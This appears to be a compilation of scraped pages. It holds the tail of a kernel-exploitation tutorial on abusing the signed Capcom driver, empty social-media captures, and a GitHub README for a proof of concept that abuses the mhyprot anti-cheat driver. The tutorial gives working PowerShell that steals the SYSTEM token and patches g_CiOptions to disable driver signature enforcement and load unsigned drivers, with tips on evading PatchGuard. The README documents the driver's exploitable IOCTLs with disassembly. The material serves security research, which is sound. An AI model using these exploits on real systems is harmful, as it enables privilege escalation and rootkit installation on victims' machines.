			$TargetTokenAddr = $NextProcess+$TokenOffset
			Write-Output "[+] Found PID: $NextPID"
			Write-Output "[+] PID token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
			break
		}
		$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	}

	# Duplicate token!
	Write-Output "[!] Duplicating SYSTEM token!`n"
	Bitmap-Write -Address $TargetTokenAddr -Value $SysToken
}
```
![](images/Capcom_6.png)

**Driver Signature Enforcement Bypass**

Adding to the long list of recommended reading in this post, I suggest you check out [@j00ru](https://twitter.com/j00ru) write-up on driver signature enforcement [here](http://j00ru.vexillium.org/?p=377). As it turns out code integrity on Windows is managed by a single binary, ci.dll (=> %WINDIR%\System32\). Pre Windows 8, CI exports a global boolean variable g\_CiEnabled, this is pretty self-explanatory either signing is enabled or it is disabled. In Windows 8+ g\_CiEnabled is replaced by another global variable, g\_CiOptions, which is a combination of flags (most importantly 0x0=disabled, 0x6=enabled, 0x8=Test Mode).

Due to Δt free-time restrictions this module will only target Win8+ installations using g\_CiOptions. However, a similar methodology can be applied to g\_CiEnabled (GitHub pull requests welcome!). Basically, we will be using the exact same technique as the Derusbi malware authors. Because g\_CiOptions is not exported we have to do some dynamic calculations when patching the value. If we decompile CI!CiInitialize we can see that it leaks a pointer to g\_CiOptions.

![](images/Capcom_7.png)

Similar to what we did before, we can leak the address for CI!CiInitialize from user-land without any kind of vulnerability!

![](images/Capcom_8.png)

From there, it is just a matter of implementing some logic to read out bytes using our bitmap primitive to look for the first "jmp" (0xE9) and then for the first "mov dword prt[xxxxx], ecx" (0x890D). Once we have the address of g\_CiOptions we can set it to whatever value we like! The powershell function below implements search logic.

```

function Capcom-DriverSigning {
	param ([Int]$SetValue)

	# Check our bitmaps have been staged into memory
	if (!$ManagerBitmap -Or !$WorkerBitmap) {
		Capcom-StageGDI
		if ($DriverNotLoaded -eq $true) {
			Return
		}
	}

	# Leak CI base => $SystemModuleCI.ImageBase
	$SystemModuleCI = Get-LoadedModules |Where-Object {$_.ImageName -Like "*CI.dll"}

	# We need DONT_RESOLVE_DLL_REFERENCES for CI LoadLibraryEx
	$CIHanle = [Capcom]::LoadLibraryEx("ci.dll", [IntPtr]::Zero, 0x1)
	$CiInitialize = [Capcom]::GetProcAddress($CIHanle, "CiInitialize")

	# Calculate => CI!CiInitialize
	$CiInitializePtr = $CiInitialize.ToInt64() - $CIHanle + $SystemModuleCI.ImageBase
	Write-Output "`n[+] CI!CiInitialize: $('{0:X}' -f $CiInitializePtr)"

	# Free CI handle
	$CallResult = [Capcom]::FreeLibrary($CIHanle)

	# Calculate => CipInitialize
	# jmp CI!CipInitialize
	for ($i=0;$i -lt 500;$i++) {
		$val = ("{0:X}" -f $(Bitmap-Read -Address $($CiInitializePtr + $i))) -split '(..)' | ? { $_ }
		# Look for the first jmp instruction
		if ($val[-1] -eq "E9") {
			$Distance = [Int]"0x$(($val[-3,-2]) -join '')"
			$CipInitialize = $Distance + 5 + $CiInitializePtr + $i
			Write-Output "[+] CI!CipInitialize: $('{0:X}' -f $CipInitialize)"
			break
		}
	}

	# Calculate => g_CiOptions
	# mov dword ptr [CI!g_CiOptions],ecx
	for ($i=0;$i -lt 500;$i++) {
		$val = ("{0:X}" -f $(Bitmap-Read -Address $($CipInitialize + $i))) -split '(..)' | ? { $_ }
		# Look for the first jmp instruction
		if ($val[-1] -eq "89" -And $val[-2] -eq "0D") {
			$Distance = [Int]"0x$(($val[-6..-3]) -join '')"
			$g_CiOptions = $Distance + 6 + $CipInitialize + $i
			Write-Output "[+] CI!g_CiOptions: $('{0:X}' -f $g_CiOptions)"
			break
		}
	}

	# print g_CiOptions
	Write-Output "[+] Current CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"

	if ($SetValue) {
		Bitmap-Write -Address $g_CiOptions -Value $SetValue
		# print new g_CiOptions
		Write-Output "[!] New CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"
	}
}
```

Case closed pretty much! The screenshot below show that the current g\_CiOptions valus is 0x6 (= Driver signing is enabled) and that we are prevented from loading "evil.sys".

![](images/Capcom_9.png)

After overwriting the value, we can successfully load our unsigned driver!

![](images/Capcom_10.png)

The slightly humorous part is that g\_CiOptions is protected by PatchGuard, which means that Windows will bluescreen (=> CRITICAL\_STRUCTURE\_CORRUPTION) if it notices that the value has been changed. This is however unlikely to happen, when testing I had to wait over one hour for PatchGuard to kick in. If you load the unsigned driver and restore the original value PatchGuard will be non the wiser! My defence-in-depth recommendation would be to trigger a PatchGuard check of CI on driver load, while this would not prevent an attacker from reflectively loading a driver it would definitely raise the bar.

## Final Thoughts

Third party, signed, drivers pose a serious threat to the integrity of the Windows Kernel as I'm sure this example illustrates. Also, I found implementing simple kernel subversion easier than expected, especially with the PatchGuard time-delay. Overall, I think the most sensible course of action is for organisations to deploy device guard with a driver whitelist to essentially eliminate this type of attack-chain!

The [Capcom-Rootkit](https://github.com/FuzzySecurity/Capcom-Rootkit) is available on GitHub for educational/testing purposes, don't be a jackass!

© Copyright [FuzzySecurity](../index.html)

[Home](../index.html) |
[Tutorials](../tutorials.html) |
[Scripting](../coding.html) |
[Exploits](../exploits.html) |
[Links](../links.html) |
[Contact](../contact.html)



=== Content from hn.algolia.com_9b6965fb_20250115_140054.html ===
This page will only work with JavaScript enabled

=== Content from twitter.com_37bac3ec_20250115_140027.html ===



=== Content from github.com_845480aa_20250115_140053.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLuohuayu%2Fevil-mhyprot-cli)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLuohuayu%2Fevil-mhyprot-cli)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Luohuayu%2Fevil-mhyprot-cli)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Luohuayu](/Luohuayu)
/
**[evil-mhyprot-cli](/Luohuayu/evil-mhyprot-cli)**
Public

forked from [leeza007/evil-mhyprot-cli](/leeza007/evil-mhyprot-cli)

* [Notifications](/login?return_to=%2FLuohuayu%2Fevil-mhyprot-cli) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2FLuohuayu%2Fevil-mhyprot-cli)
* [Star
   5](/login?return_to=%2FLuohuayu%2Fevil-mhyprot-cli)

A PoC for vulnerable driver "mhyprot" that allows us to read/write memory in kernel/user from usermode.

### License

[MIT license](/Luohuayu/evil-mhyprot-cli/blob/main/LICENSE)

[5
stars](/Luohuayu/evil-mhyprot-cli/stargazers) [50
forks](/Luohuayu/evil-mhyprot-cli/forks) [Branches](/Luohuayu/evil-mhyprot-cli/branches) [Tags](/Luohuayu/evil-mhyprot-cli/tags) [Activity](/Luohuayu/evil-mhyprot-cli/activity)
 [Star](/login?return_to=%2FLuohuayu%2Fevil-mhyprot-cli)

 [Notifications](/login?return_to=%2FLuohuayu%2Fevil-mhyprot-cli) You must be signed in to change notification settings

* [Code](/Luohuayu/evil-mhyprot-cli)
* [Pull requests
  0](/Luohuayu/evil-mhyprot-cli/pulls)
* [Actions](/Luohuayu/evil-mhyprot-cli/actions)
* [Projects
  0](/Luohuayu/evil-mhyprot-cli/projects)
* [Security](/Luohuayu/evil-mhyprot-cli/security)
* [Insights](/Luohuayu/evil-mhyprot-cli/pulse)

Additional navigation options

* [Code](/Luohuayu/evil-mhyprot-cli)
* [Pull requests](/Luohuayu/evil-mhyprot-cli/pulls)
* [Actions](/Luohuayu/evil-mhyprot-cli/actions)
* [Projects](/Luohuayu/evil-mhyprot-cli/projects)
* [Security](/Luohuayu/evil-mhyprot-cli/security)
* [Insights](/Luohuayu/evil-mhyprot-cli/pulse)

# Luohuayu/evil-mhyprot-cli

    main[Branches](/Luohuayu/evil-mhyprot-cli/branches)[Tags](/Luohuayu/evil-mhyprot-cli/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[142 Commits](/Luohuayu/evil-mhyprot-cli/commits/main/) | | |
| [IDA](/Luohuayu/evil-mhyprot-cli/tree/main/IDA "IDA") | | [IDA](/Luohuayu/evil-mhyprot-cli/tree/main/IDA "IDA") |  |  |
| [images](/Luohuayu/evil-mhyprot-cli/tree/main/images "images") | | [images](/Luohuayu/evil-mhyprot-cli/tree/main/images "images") |  |  |
| [libmhyprot @ c4734e6](/kkent030315/libmhyprot/tree/c4734e62d119dcf6294a9d6175c99984fd66b856 "libmhyprot") | | [libmhyprot @ c4734e6](/kkent030315/libmhyprot/tree/c4734e62d119dcf6294a9d6175c99984fd66b856 "libmhyprot") |  |  |
| [src](/Luohuayu/evil-mhyprot-cli/tree/main/src "src") | | [src](/Luohuayu/evil-mhyprot-cli/tree/main/src "src") |  |  |
| [.gitignore](/Luohuayu/evil-mhyprot-cli/blob/main/.gitignore ".gitignore") | | [.gitignore](/Luohuayu/evil-mhyprot-cli/blob/main/.gitignore ".gitignore") |  |  |
| [.gitmodules](/Luohuayu/evil-mhyprot-cli/blob/main/.gitmodules ".gitmodules") | | [.gitmodules](/Luohuayu/evil-mhyprot-cli/blob/main/.gitmodules ".gitmodules") |  |  |
| [LICENSE](/Luohuayu/evil-mhyprot-cli/blob/main/LICENSE "LICENSE") | | [LICENSE](/Luohuayu/evil-mhyprot-cli/blob/main/LICENSE "LICENSE") |  |  |
| [README.md](/Luohuayu/evil-mhyprot-cli/blob/main/README.md "README.md") | | [README.md](/Luohuayu/evil-mhyprot-cli/blob/main/README.md "README.md") |  |  |
| [evil-mhyprot-cli.sln](/Luohuayu/evil-mhyprot-cli/blob/main/evil-mhyprot-cli.sln "evil-mhyprot-cli.sln") | | [evil-mhyprot-cli.sln](/Luohuayu/evil-mhyprot-cli/blob/main/evil-mhyprot-cli.sln "evil-mhyprot-cli.sln") |  |  |
| [image01.png](/Luohuayu/evil-mhyprot-cli/blob/main/image01.png "image01.png") | | [image01.png](/Luohuayu/evil-mhyprot-cli/blob/main/image01.png "image01.png") |  |  |
| [image02.png](/Luohuayu/evil-mhyprot-cli/blob/main/image02.png "image02.png") | | [image02.png](/Luohuayu/evil-mhyprot-cli/blob/main/image02.png "image02.png") |  |  |
| [image03.png](/Luohuayu/evil-mhyprot-cli/blob/main/image03.png "image03.png") | | [image03.png](/Luohuayu/evil-mhyprot-cli/blob/main/image03.png "image03.png") |  |  |
| [image04.png](/Luohuayu/evil-mhyprot-cli/blob/main/image04.png "image04.png") | | [image04.png](/Luohuayu/evil-mhyprot-cli/blob/main/image04.png "image04.png") |  |  |
| [image05.png](/Luohuayu/evil-mhyprot-cli/blob/main/image05.png "image05.png") | | [image05.png](/Luohuayu/evil-mhyprot-cli/blob/main/image05.png "image05.png") |  |  |
| [image06.png](/Luohuayu/evil-mhyprot-cli/blob/main/image06.png "image06.png") | | [image06.png](/Luohuayu/evil-mhyprot-cli/blob/main/image06.png "image06.png") |  |  |
| [image07.png](/Luohuayu/evil-mhyprot-cli/blob/main/image07.png "image07.png") | | [image07.png](/Luohuayu/evil-mhyprot-cli/blob/main/image07.png "image07.png") |  |  |
| [image08.png](/Luohuayu/evil-mhyprot-cli/blob/main/image08.png "image08.png") | | [image08.png](/Luohuayu/evil-mhyprot-cli/blob/main/image08.png "image08.png") |  |  |
| [image09.png](/Luohuayu/evil-mhyprot-cli/blob/main/image09.png "image09.png") | | [image09.png](/Luohuayu/evil-mhyprot-cli/blob/main/image09.png "image09.png") |  |  |
| [mhyprot.png](/Luohuayu/evil-mhyprot-cli/blob/main/mhyprot.png "mhyprot.png") | | [mhyprot.png](/Luohuayu/evil-mhyprot-cli/blob/main/mhyprot.png "mhyprot.png") |  |  |
| [seedmap.txt](/Luohuayu/evil-mhyprot-cli/blob/main/seedmap.txt "seedmap.txt") | | [seedmap.txt](/Luohuayu/evil-mhyprot-cli/blob/main/seedmap.txt "seedmap.txt") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/image01.png)](/Luohuayu/evil-mhyprot-cli/blob/main/image01.png)
[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/image04.png)](/Luohuayu/evil-mhyprot-cli/blob/main/image04.png)
[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/image05.png)](/Luohuayu/evil-mhyprot-cli/blob/main/image05.png)

# evil-mhyprot-cli

A PoC for vulnerable driver "mhyprot" that allows us to read/write memory in kernel/user from usermode.

### Static Library is here: [libmhyprot](https://github.com/kkent030315/libmhyprot)

# Updates

* 10/20/2020 implemented thread enumeration
* 10/20/2020 implemented mhyprot::driver\_impl::get\_system\_uptime
* 10/19/2020 implemented module eunmeration

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/images/image10.png)](/Luohuayu/evil-mhyprot-cli/blob/main/images/image10.png)

# Overview

What we can do with this CLI is as follows:

* Read/Write any kernel memory with privilege of kernel from usermode
* Read/Write any user memory with privilege of kernel from usermode
* Enumerate a number of modules by specific process id (**New**)
* Get system uptime (**New**)
* Enumerate threads in specific process, result in allows us to reading `PETHREAD` structure in the kernel directly from CLI as well.
* All operations are executed as kernel level privilege (ring-0) by the vulnerable driver

Also:

* Administrator privilege only needed if the service is not yet running
* Therefore we can execute commands above as the normal user (w/o administrator privilege)

---

The `mhyprot` is an anti-cheat kernel mode driver used in [`Genshin Impact`](https://genshin.mihoyo.com/ja).

The driver has vulnerable `IOCTL` commands that allows us to execute `MmCopyVirtualMemory` and `memcpy(in the kernel!)` from ring-3 (usermode).

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/mhyprot.png)](/Luohuayu/evil-mhyprot-cli/blob/main/mhyprot.png)

# Impact

Investigating

# Requirements

* Any version of Windows x64 that the driver works on
* Administrator privilege **does not required** if the service already running

Tested on:

* Windows10 x64 1903
* Windows7 x64 6.1
* Windows8.1 x64 6.3

# Usage

```
bin.exe [TargetProcess] -options

```

following options are available as of now:

* `t`
  + Perform Tests
* `d`
  + Print debug infos
* `s`
  + Print seedmap

# Analysis and Proofs

> The document(s) below is still in write
> so please forgive any mistakes I took in advance.

## IOCTL Handler Functions

So what I did is that to reverse engineering around IOCTL handling functionalities.

Since around ioctl functions and its functionalities are packed, to reverse engineering is not easy than average.

but I can still easily find the function that registered at `DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]` since the IOCTL handler must have an `IoCompleteRequest` or like `IofCompleteRequest` that exported by `ntoskrnl`.

(Btw `IoCompleteRequest` is just a wrapper of `IofCompleteRequest`)

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/image03.png)](/Luohuayu/evil-mhyprot-cli/blob/main/image03.png)

As mhyprot imports `IofCompleteRequest` then go xrefs, and we will see there are many ioctl handlers.

Concretely, I found two big subroutine in packed segment.

I've added it to [this repo](/Luohuayu/evil-mhyprot-cli/blob/main/IDA) as binary since it's too big.

* [sub\_FFFFF800188CD000](/Luohuayu/evil-mhyprot-cli/blob/main/IDA/sub_FFFFF800188CD000.txt)
  + -> [Pseudocode](https://github.com/kkent030315/evil-mhyprot-cli/blob/main/IDA/FUN_0001d000.cpp)
* [sub\_FFFFF800188CD6E0](/Luohuayu/evil-mhyprot-cli/blob/main/IDA/sub_FFFFF800188CD6E0.txt)
  + -> [Pseudocode](https://github.com/kkent030315/evil-mhyprot-cli/blob/main/IDA/FUN_0001d6e0.cpp)

I will keep update if I found more another subroutine.

## Driver Initialization

The `MHYPROT_IOCTL_INITIALIZE` what I defined in [mhyprot.hpp#L18](/Luohuayu/evil-mhyprot-cli/blob/main/src/mhyprot.hpp#L18) can be found as follows:

```
PAGE:FFFFF800188CD8FD loc_FFFFF800188CD8FD:                   ; CODE XREF: sub_FFFFF800188CD6E0+213↑j
PAGE:FFFFF800188CD8FD                 cmp     ecx, 80034000h  ; MHYPROT_IOCTL_INITIALIZE
PAGE:FFFFF800188CD903                 jnz     short loc_FFFFF800188CD984
PAGE:FFFFF800188CD905                 cmp     r8d, 10h
PAGE:FFFFF800188CD909                 jnz     loc_FFFFF800188CDA4F
PAGE:FFFFF800188CD90F                 mov     rax, 0EBBAAEF4FFF89042h // <- _m_002
PAGE:FFFFF800188CD919                 xor     [rdi+8], rax
PAGE:FFFFF800188CD91D                 mov     rax, [rdi+8]
PAGE:FFFFF800188CD921                 xor     [rdi], rax
PAGE:FFFFF800188CD924                 cmp     dword ptr [rdi+4], 0BAEBAEECh // <- _m_001
PAGE:FFFFF800188CD92B                 jnz     loc_FFFFF800188CDA4F
PAGE:FFFFF800188CD931                 mov     ecx, [rdi]
PAGE:FFFFF800188CD933                 call    sub_FFFFF800188C51A8
PAGE:FFFFF800188CD938                 cmp     dword ptr cs:qword_FFFFF800188CA108, 0
PAGE:FFFFF800188CD93F                 jnz     short loc_FFFFF800188CD97D
PAGE:FFFFF800188CD941                 mov     rdx, [rdi+8]
PAGE:FFFFF800188CD945                 lea     rcx, xmmword_FFFFF800188CA0E8
PAGE:FFFFF800188CD94C                 call    sub_FFFFF800188C301C // <-
PAGE:FFFFF800188CD951                 mov     ebx, 7
```

and the `sub_FFFFF800188C301C` is look like:

```
.text:FFFFF800188C301C ; =============== S U B R O U T I N E =======================================
.text:FFFFF800188C301C
.text:FFFFF800188C301C
.text:FFFFF800188C301C sub_FFFFF800188C301C proc near          ; CODE XREF: sub_FFFFF800188CD6E0+26C↓p
.text:FFFFF800188C301C                                         ; DATA XREF: .upx0:FFFFF800189F2BA8↓o
.text:FFFFF800188C301C
.text:FFFFF800188C301C arg_0           = qword ptr  8
.text:FFFFF800188C301C
.text:FFFFF800188C301C                 test    rcx, rcx
.text:FFFFF800188C301F                 jz      locret_FFFFF800188C30B4
.text:FFFFF800188C3025                 mov     [rsp+arg_0], rbx
.text:FFFFF800188C302A                 push    rdi
.text:FFFFF800188C302B                 sub     rsp, 20h
.text:FFFFF800188C302F                 xor     eax, eax
.text:FFFFF800188C3031                 mov     rdi, rdx
.text:FFFFF800188C3034                 mov     [rcx], rax
.text:FFFFF800188C3037                 mov     rbx, rcx
.text:FFFFF800188C303A                 mov     [rcx+8], rax
.text:FFFFF800188C303E                 mov     edx, 9C0h       ; NumberOfBytes
.text:FFFFF800188C3043                 xor     ecx, ecx        ; PoolType
.text:FFFFF800188C3045                 call    cs:ExAllocatePool
.text:FFFFF800188C304B                 xor     edx, edx
.text:FFFFF800188C304D                 mov     r8d, 9C0h
.text:FFFFF800188C3053                 mov     rcx, rax
.text:FFFFF800188C3056                 mov     [rbx], rax
.text:FFFFF800188C3059                 call    sub_FFFFF800188C7900
.text:FFFFF800188C305E                 mov     rax, [rbx]
.text:FFFFF800188C3061                 mov     r9d, 1
.text:FFFFF800188C3067                 mov     [rbx+0Ch], r9d
.text:FFFFF800188C306B                 mov     [rax], rdi
.text:FFFFF800188C306E                 mov     [rbx+8], r9d
.text:FFFFF800188C3072
.text:FFFFF800188C3072 loc_FFFFF800188C3072:                   ; CODE XREF: sub_FFFFF800188C301C+8C↓j
.text:FFFFF800188C3072                 movsxd  r8, dword ptr [rbx+8]
.text:FFFFF800188C3076                 mov     rdx, [rbx]
.text:FFFFF800188C3079                 mov     rax, [rdx+r8*8-8]
.text:FFFFF800188C307E                 mov     rcx, rax
.text:FFFFF800188C3081                 shr     rcx, 3Eh
.text:FFFFF800188C3085                 xor     rcx, rax
.text:FFFFF800188C3088                 mov     rax, 5851F42D4C957F2Dh
.text:FFFFF800188C3092                 imul    rcx, rax
.text:FFFFF800188C3096                 add     rcx, r8
.text:FFFFF800188C3099                 mov     [rdx+r8*8], rcx
.text:FFFFF800188C309D                 add     [rbx+8], r9d
.text:FFFFF800188C30A1                 cmp     dword ptr [rbx+8], 138h
.text:FFFFF800188C30A8                 jl      short loc_FFFFF800188C3072
.text:FFFFF800188C30AA                 mov     rbx, [rsp+28h+arg_0]
.text:FFFFF800188C30AF                 add     rsp, 20h
.text:FFFFF800188C30B3                 pop     rdi
.text:FFFFF800188C30B4
.text:FFFFF800188C30B4 locret_FFFFF800188C30B4:                ; CODE XREF: sub_FFFFF800188C301C+3↑j
.text:FFFFF800188C30B4                 retn
.text:FFFFF800188C30B4 sub_FFFFF800188C301C endp
```

## A Way of Read/Write Specific Process Memory

The mhyprot calls `MmCopyVirtualMemory` eventually as wrapper defined as follows:

```
__int64 __fastcall sub_FFFFF800188C3EB8(struct _EPROCESS *a1, _DWORD *a2, __int64 a3)
{
  __int64 v3; // rbp
  _DWORD *v4; // rdi
  struct _EPROCESS *v5; // rbx
  PEPROCESS v6; // rsi
  char v8; // [rsp+28h] [rbp-20h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  if ( *a2 == 1 )
  {
    v6 = IoGetCurrentProcess();
  }
  else
  {
    v6 = a1;
    v5 = IoGetCurrentProcess();
  }
  v8 = 0;
  return MmCopyVirtualMemory(v6, *((_QWORD *)v4 + 3), v5, *((_QWORD *)v4 + 2), (unsigned int)v4[8], v8, v3);
}
```

Called by:

```
__int64 __fastcall sub_FFFFF800188C3F2C(_DWORD *a1_rw_request, __int64 a2_returnsize, __int64 a3)
{
  __int64 v3_returnsize; // rsi
  _DWORD *v4_rw_request; // rbx
  __int64 v5_processid; // rcx
  bool v6_ntstatus_lookup_success_bool; // di
  unsigned int v8_ntstatus; // ebx
  PVOID Object; // [rsp+40h] [rbp+8h]

  v3_returnsize = a2_returnsize;
  v4_rw_request = a1_rw_request;
  v5_processid = (unsigned int)a1_rw_request[2];
  Object = 0i64;
  v6_ntstatus_lookup_success_bool = (int)PsLookupProcessByProcessId(v5_processid, &Object, a3) >= 0;// NT_SUCCESS
  if ( !Object )
    return 3221225473i64;
  v8_ntstatus = sub_FFFFF800188C3EB8((struct _EPROCESS *)Object, v4_rw_request, v3_returnsize);
  if ( v6_ntstatus_lookup_success_bool )
    ObfDereferenceObject(Object);
  return v8_ntstatus;
}
```

Called by:

```
bool __fastcall sub_FFFFF800188C4214(_DWORD *a1_rw_request, _DWORD *a2_returnsize, __int64 a3)
{
  _DWORD *v3_returnsize; // rbx
  int v5_ntstatus; // [rsp+20h] [rbp-18h]
  __int64 v6_returnsize; // [rsp+50h] [rbp+18h]

  v3_returnsize = a2_returnsize;
  v6_returnsize = 0i64;
  v5_ntstatus = sub_FFFFF800188C3F2C(a1_rw_request, (__int64)&v6_returnsize, a3);
  *v3_returnsize = v6_returnsize;
  return v5_ntstatus == 0;                      // NT_SUCCESS(v5_ntstatus)
}
```

Finally we are at the root of the tree:

```
PAGE:FFFFF800188CD303 loc_FFFFF800188CD303:                   ; CODE XREF: sub_FFFFF800188CD000+2C7↑j
PAGE:FFFFF800188CD303                 and     dword ptr [rbp+1D0h+arg_20], 0
PAGE:FFFFF800188CD30A                 lea     rdx, [rbp+1D0h+arg_20]
PAGE:FFFFF800188CD311                 mov     rcx, [rsp+30h]
PAGE:FFFFF800188CD316                 call    sub_FFFFF800188C4214 // <- Here
PAGE:FFFFF800188CD31B                 jmp     loc_FFFFF800188CD21C
```

Call map:

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/image06.png)](/Luohuayu/evil-mhyprot-cli/blob/main/image06.png)

### Proof

I have confirmed that by simply hooking mhyprot kernel module:

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/image08.png)](/Luohuayu/evil-mhyprot-cli/blob/main/image08.png)

## A Way of Read Kernel Memory

We can see so many IOCTL commands and the `MHYPROT_IOCTL_READ_KERNEL_MEMORY` what I defined in [mhyprot.hpp#L19](/Luohuayu/evil-mhyprot-cli/blob/main/src/mhyprot.hpp#L19) can be found as follows:

```
PAGE:FFFFF800188CD7A9 loc_FFFFF800188CD7A9:                   ; CODE XREF: sub_FFFFF800188CD6E0+BA↑j
PAGE:FFFFF800188CD7A9                 cmp     ecx, 83064000h  ; MHYPROT_IOCTL_READ_KERNEL_MEMORY
PAGE:FFFFF800188CD7AF                 jnz     short loc_FFFFF800188CD7C8
PAGE:FFFFF800188CD7B1                 mov     rdx, [rdi]
PAGE:FFFFF800188CD7B4                 lea     rcx, [rdi+4]
PAGE:FFFFF800188CD7B8                 mov     r8d, [rdi+8]
PAGE:FFFFF800188CD7BC                 call    sub_FFFFF800188C63A8 // <-
```

And the `sub_FFFFF800188C63A8` is like:

```
.text:FFFFF800188C63A8 sub_FFFFF800188C63A8 proc near          ; CODE XREF: sub_FFFFF800188CD6E0+DC↓p
.text:FFFFF800188C63A8                                         ; DATA XREF: .upx0:FFFFF800189F2EE4↓o
.text:FFFFF800188C63A8
.text:FFFFF800188C63A8 arg_0           = qword ptr  8
.text:FFFFF800188C63A8 arg_8           = qword ptr  10h
.text:FFFFF800188C63A8
.text:FFFFF800188C63A8                 mov     [rsp+arg_0], rbx
.text:FFFFF800188C63AD                 mov     [rsp+arg_8], rsi
.text:FFFFF800188C63B2                 push    rdi
.text:FFFFF800188C63B3                 sub     rsp, 20h
.text:FFFFF800188C63B7                 mov     edi, r8d
.text:FFFFF800188C63BA                 mov     rbx, rdx
.text:FFFFF800188C63BD                 mov     rsi, rcx
.text:FFFFF800188C63C0                 test    rdx, rdx
.text:FFFFF800188C63C3                 jz      short loc_FFFFF800188C63F2
.text:FFFFF800188C63C5                 test    r8d, r8d
.text:FFFFF800188C63C8                 jz      short loc_FFFFF800188C63F2
.text:FFFFF800188C63CA                 mov     rax, cs:MmHighestUserAddress
.text:FFFFF800188C63D1                 cmp     rdx, [rax]
.text:FFFFF800188C63D4                 jb      short loc_FFFFF800188C63F2
.text:FFFFF800188C63D6                 mov     r8d, edi
.text:FFFFF800188C63D9                 xor     edx, edx
.text:FFFFF800188C63DB                 call    sub_FFFFF800188C7900
.text:FFFFF800188C63E0                 mov     r8d, edi
.text:FFFFF800188C63E3                 mov     rdx, rsi
.text:FFFFF800188C63E6                 mov     rcx, rbx
.text:FFFFF800188C63E9                 call    sub_FFFFF800188C3DD8
.text:FFFFF800188C63EE                 xor     eax, eax
.text:FFFFF800188C63F0                 jmp     short loc_FFFFF800188C63F5
```

Here is the ioctl handlers, found the `0x83064000`(`MHYPROT_IOCTL_READ_KERNEL_MEMORY`) as `cmp ecx, 83064000h` and some another ioctl codes as follows:

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/image02.png)](/Luohuayu/evil-mhyprot-cli/blob/main/image02.png)

Call map:

As I defined as `DWORD result` in [mhyprot.hpp#L40](https://github.com/kkent030315/evil-mhyprot-cli/blob/main/src/mhyprot.hpp#L40) the first 4bytes is result.

I can guess it's a `NTSTATUS` as it typedef'ed as `typedef LONG NTSTATUS` natively and the dispathers return types are `NTSTATUS` and the result will directly be got stored from it.

